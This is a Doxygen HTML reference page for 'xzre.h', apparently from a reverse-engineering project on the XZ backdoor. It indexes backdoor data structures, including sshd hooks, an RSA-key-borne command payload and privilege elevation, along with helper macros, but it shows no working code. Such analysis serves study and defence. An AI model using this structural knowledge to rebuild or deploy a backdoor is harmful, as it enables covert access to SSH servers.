<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.9.1"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>xzre: xzre.h File Reference</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">xzre
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.1 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:cf05388f2679ee054f2beb29a391d25f4e673ac3&amp;dn=gpl-2.0.txt GPL-v2 */
var searchBox = new SearchBox("searchBox", "search",false,'Search','.html');
/* @license-end */
</script>
<script type="text/javascript" src="menudata.js"></script>
<script type="text/javascript" src="menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:cf05388f2679ee054f2beb29a391d25f4e673ac3&amp;dn=gpl-2.0.txt GPL-v2 */
$(function() {
  initMenu('',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */</script>
<div id="main-nav"></div>
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

</div><!-- top -->
<div class="header">
  <div class="summary">
<a href="#nested-classes">Data Structures</a> &#124;
<a href="#define-members">Macros</a> &#124;
<a href="#typedef-members">Typedefs</a> &#124;
<a href="#enum-members">Enumerations</a> &#124;
<a href="#func-members">Functions</a> &#124;
<a href="#var-members">Variables</a>  </div>
  <div class="headertitle">
<div class="title">xzre.h File Reference</div>  </div>
</div><!--header-->
<div class="contents">

<p>XZ backdoor structures and functions.  
<a href="#details">More...</a></p>
<div class="textblock"><code>#include &lt;assert.h&gt;</code><br />
<code>#include &lt;link.h&gt;</code><br />
<code>#include &lt;stddef.h&gt;</code><br />
<code>#include &lt;stdint.h&gt;</code><br />
<code>#include &lt;sys/select.h&gt;</code><br />
<code>#include &lt;time.h&gt;</code><br />
<code>#include &lt;lzma.h&gt;</code><br />
<code>#include &lt;openssl/dsa.h&gt;</code><br />
<code>#include &lt;openssl/ec.h&gt;</code><br />
<code>#include &lt;openssl/evp.h&gt;</code><br />
<code>#include &lt;openssl/rsa.h&gt;</code><br />
<code>#include &lt;elf.h&gt;</code><br />
<code>#include &quot;util.h&quot;</code><br />
</div>
<p><a href="xzre_8h_source.html">Go to the source code of this file.</a></p>
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="nested-classes"></a>
Data Structures</h2></td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structauditstate.html">auditstate</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structgnu__hash__table.html">gnu_hash_table</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structaudit__ifaces.html">audit_ifaces</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structlzma__sha256__state.html">lzma_sha256_state</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">State for the internal SHA-256 implementation.  <a href="structlzma__sha256__state.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structlzma__check__state.html">lzma_check_state</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">Structure to hold internal state of the check being calculated.  <a href="structlzma__check__state.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structmonitor.html">monitor</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">struct monitor from openssh-portable  <a href="structmonitor.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsensitive__data.html">sensitive_data</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">struct <a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a> from openssh-portable  <a href="structsensitive__data.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshkey.html">sshkey</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">struct sshkey from openssh-portable  <a href="structsshkey.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structgot__ctx.html">got_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structdasm__ctx.html">dasm_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__info.html">elf_info</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structlibc__imports.html">libc_imports</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structimported__funcs.html">imported_funcs</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshd__ctx.html">sshd_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshd__log__ctx.html">sshd_log_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">union &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="unionsshd__offsets__kex.html">sshd_offsets_kex</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">union &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="unionsshd__offsets__sshbuf.html">sshd_offsets_sshbuf</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshd__offsets__fields.html">sshd_offsets_fields</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshd__offsets.html">sshd_offsets</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshd__payload__ctx.html">sshd_payload_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structglobal__context.html">global_context</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structldso__ctx.html">ldso_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__handles.html">elf_handles</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">array of ELF handles  <a href="structelf__handles.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structmain__elf.html">main_elf</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__data__handle.html">backdoor_data_handle</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">data passed to functions that access the backdoor data  <a href="structbackdoor__data__handle.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structstring__item.html">string_item</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structstring__references.html">string_references</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__data.html">backdoor_data</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">this structure is used to hold most of the backdoor information. it's used as a local variable in function <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a>  <a href="structbackdoor__data.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">union &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">represents a shift register, which will shift a '1' into the secret data array. the low 3 bits represent the bit index, while the rest represents the byte index this is convenient, since a simple increment will increment the buffer position correctly  <a href="unionsecret__data__shift__cursor__t.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsecret__data__item.html">secret_data_item</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__payload__hdr.html">key_payload_hdr</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">the payload header. also used as Chacha IV  <a href="structkey__payload__hdr.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">union &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="unionu__cmd__arguments__t.html">u_cmd_arguments_t</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structcmd__arguments.html">cmd_arguments</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__payload__body.html">key_payload_body</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__payload.html">key_payload</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">the contents of the RSA 'n' field  <a href="structkey__payload.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__ctx.html">key_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structmonitor__data.html">monitor_data</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">data used within <a class="el" href="xzre_8h.html#a60b93ed64ba904012e9fa9477e97a244">sshd_proxy_elevate</a>  <a href="structmonitor__data.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">union &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="unionbackdoor__runtime__data.html">backdoor_runtime_data</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">union used within <a class="el" href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">run_backdoor_commands</a>  <a href="unionbackdoor__runtime__data.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structrun__backdoor__commands__data.html">run_backdoor_commands_data</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">stack frame layout for <a class="el" href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">run_backdoor_commands</a>  <a href="structrun__backdoor__commands__data.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__functions.html">elf_functions</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structdl__tls__index.html">dl_tls_index</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="define-members"></a>
Macros</h2></td></tr>
<tr class="memitem:a369266c24eacffb87046522897a570d5"><td class="memItemLeft" align="right" valign="top"><a id="a369266c24eacffb87046522897a570d5"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>_GNU_SOURCE</b></td></tr>
<tr class="separator:a369266c24eacffb87046522897a570d5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab00cb4aeb1653ec4164170204142f57e"><td class="memItemLeft" align="right" valign="top"><a id="ab00cb4aeb1653ec4164170204142f57e"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>UPTR</b>(x)&#160;&#160;&#160;((uptr)(x))</td></tr>
<tr class="separator:ab00cb4aeb1653ec4164170204142f57e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac8b325ef6e0fe3c944a4847a4b1f96c9"><td class="memItemLeft" align="right" valign="top"><a id="ac8b325ef6e0fe3c944a4847a4b1f96c9"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PTRADD</b>(a,  b)&#160;&#160;&#160;(UPTR(a) + UPTR(b))</td></tr>
<tr class="separator:ac8b325ef6e0fe3c944a4847a4b1f96c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a39ad72fe76265f5bc6cc25a95b54e2cd"><td class="memItemLeft" align="right" valign="top"><a id="a39ad72fe76265f5bc6cc25a95b54e2cd"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PTRDIFF</b>(a,  b)&#160;&#160;&#160;(UPTR(a) - UPTR(b))</td></tr>
<tr class="separator:a39ad72fe76265f5bc6cc25a95b54e2cd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab57fd92ea606d15c3291e6bc0396c8af"><td class="memItemLeft" align="right" valign="top"><a id="ab57fd92ea606d15c3291e6bc0396c8af"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>BUILD_BUG_ON_ZERO</b>(e)&#160;&#160;&#160;((int)(sizeof(struct { int:(-!!(e)); })))</td></tr>
<tr class="separator:ab57fd92ea606d15c3291e6bc0396c8af"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a450aeb766a9af43aa7f9faf1279c8c8f"><td class="memItemLeft" align="right" valign="top"><a id="a450aeb766a9af43aa7f9faf1279c8c8f"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>__same_type</b>(a,  b)&#160;&#160;&#160;__builtin_types_compatible_p(typeof(a), typeof(b))</td></tr>
<tr class="separator:a450aeb766a9af43aa7f9faf1279c8c8f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1f27072e3a686ca053626f23d2551457"><td class="memItemLeft" align="right" valign="top"><a id="a1f27072e3a686ca053626f23d2551457"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>__must_be_array</b>(a)&#160;&#160;&#160;BUILD_BUG_ON_ZERO(__same_type((a), &amp;(a)[0]))</td></tr>
<tr class="separator:a1f27072e3a686ca053626f23d2551457"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3c7c6a69f690fc8d2abf0e385280a532"><td class="memItemLeft" align="right" valign="top"><a id="a3c7c6a69f690fc8d2abf0e385280a532"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>ARRAY_SIZE</b>(arr)&#160;&#160;&#160;(sizeof(arr) / sizeof((arr)[0]) + __must_be_array(arr))</td></tr>
<tr class="separator:a3c7c6a69f690fc8d2abf0e385280a532"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6896a846037d86082bae82ff5a3569cc"><td class="memItemLeft" align="right" valign="top"><a id="a6896a846037d86082bae82ff5a3569cc"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>CHACHA20_KEY_SIZE</b>&#160;&#160;&#160;32</td></tr>
<tr class="separator:a6896a846037d86082bae82ff5a3569cc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4f80bde27fe7bda6e2d1242132dd0f15"><td class="memItemLeft" align="right" valign="top"><a id="a4f80bde27fe7bda6e2d1242132dd0f15"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>CHACHA20_IV_SIZE</b>&#160;&#160;&#160;16</td></tr>
<tr class="separator:a4f80bde27fe7bda6e2d1242132dd0f15"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a81efbc0fc101b06a914f7ff9e2fbc0e9"><td class="memItemLeft" align="right" valign="top"><a id="a81efbc0fc101b06a914f7ff9e2fbc0e9"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>SHA256_DIGEST_SIZE</b>&#160;&#160;&#160;32</td></tr>
<tr class="separator:a81efbc0fc101b06a914f7ff9e2fbc0e9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a518e532b039564adb2224c60f3d93757"><td class="memItemLeft" align="right" valign="top"><a id="a518e532b039564adb2224c60f3d93757"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>ED448_KEY_SIZE</b>&#160;&#160;&#160;57</td></tr>
<tr class="separator:a518e532b039564adb2224c60f3d93757"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acd83dd1055c648ff991c81bd53e7f677"><td class="memItemLeft" align="right" valign="top"><a id="acd83dd1055c648ff991c81bd53e7f677"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>ED448_SIGNATURE_SIZE</b>&#160;&#160;&#160;114</td></tr>
<tr class="separator:acd83dd1055c648ff991c81bd53e7f677"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1045acf85e8ae6f44f8bb1dfeb52ce48"><td class="memItemLeft" align="right" valign="top"><a id="a1045acf85e8ae6f44f8bb1dfeb52ce48"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>X_BN_num_bytes</b>(bits)&#160;&#160;&#160;(((bits)+7)/8)</td></tr>
<tr class="separator:a1045acf85e8ae6f44f8bb1dfeb52ce48"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1974ecd89574bc861c90392b3d570dcb"><td class="memItemLeft" align="right" valign="top"><a id="a1974ecd89574bc861c90392b3d570dcb"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>XZDASM_OPC</b>(op)&#160;&#160;&#160;(op - 0x80)</td></tr>
<tr class="separator:a1974ecd89574bc861c90392b3d570dcb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa8cecfc5c5c054d2875c03e77b7be15d"><td class="memItemLeft" align="right" valign="top"><a id="aa8cecfc5c5c054d2875c03e77b7be15d"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>TRUE</b>&#160;&#160;&#160;1</td></tr>
<tr class="separator:aa8cecfc5c5c054d2875c03e77b7be15d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa93f0eb578d23995850d61f7d61c55c1"><td class="memItemLeft" align="right" valign="top"><a id="aa93f0eb578d23995850d61f7d61c55c1"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>FALSE</b>&#160;&#160;&#160;0</td></tr>
<tr class="separator:aa93f0eb578d23995850d61f7d61c55c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa5fd0af1f78d21cfc6f8c25bef9f14bc"><td class="memItemLeft" align="right" valign="top"><a id="aa5fd0af1f78d21cfc6f8c25bef9f14bc"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b>(t,  f,  o)&#160;&#160;&#160;static_assert(offsetof(t, f) == o)</td></tr>
<tr class="separator:aa5fd0af1f78d21cfc6f8c25bef9f14bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2f18db18bca26cafa95e9719de4a41ef"><td class="memItemLeft" align="right" valign="top"><a id="a2f18db18bca26cafa95e9719de4a41ef"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>CONCAT</b>(x,  y)&#160;&#160;&#160;x ## y</td></tr>
<tr class="separator:a2f18db18bca26cafa95e9719de4a41ef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5af923cb05ed3e3ff98866990b79752d"><td class="memItemLeft" align="right" valign="top"><a id="a5af923cb05ed3e3ff98866990b79752d"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>EXPAND</b>(x,  y)&#160;&#160;&#160;CONCAT(x, y)</td></tr>
<tr class="separator:a5af923cb05ed3e3ff98866990b79752d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a353d32e52768fa413b9d1f381a201efa"><td class="memItemLeft" align="right" valign="top"><a id="a353d32e52768fa413b9d1f381a201efa"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PADDING</b>(size)&#160;&#160;&#160;u8 EXPAND(_unknown, __LINE__)[size]</td></tr>
<tr class="separator:a353d32e52768fa413b9d1f381a201efa"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a01c6a0e01d7895d7fcebd10a1c543d6c"><td class="memItemLeft" align="right" valign="top"><a id="a01c6a0e01d7895d7fcebd10a1c543d6c"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PERMIT_NOT_SET</b>&#160;&#160;&#160;-1</td></tr>
<tr class="separator:a01c6a0e01d7895d7fcebd10a1c543d6c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9fc7f3aab6653d0f97e652965991e42e"><td class="memItemLeft" align="right" valign="top"><a id="a9fc7f3aab6653d0f97e652965991e42e"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PERMIT_NO</b>&#160;&#160;&#160;0</td></tr>
<tr class="separator:a9fc7f3aab6653d0f97e652965991e42e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adf35b9ab41134233edfe5ab50571edfe"><td class="memItemLeft" align="right" valign="top"><a id="adf35b9ab41134233edfe5ab50571edfe"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PERMIT_FORCED_ONLY</b>&#160;&#160;&#160;1</td></tr>
<tr class="separator:adf35b9ab41134233edfe5ab50571edfe"><td class="memSeparator" colspan="2">&#160;</td></tr>
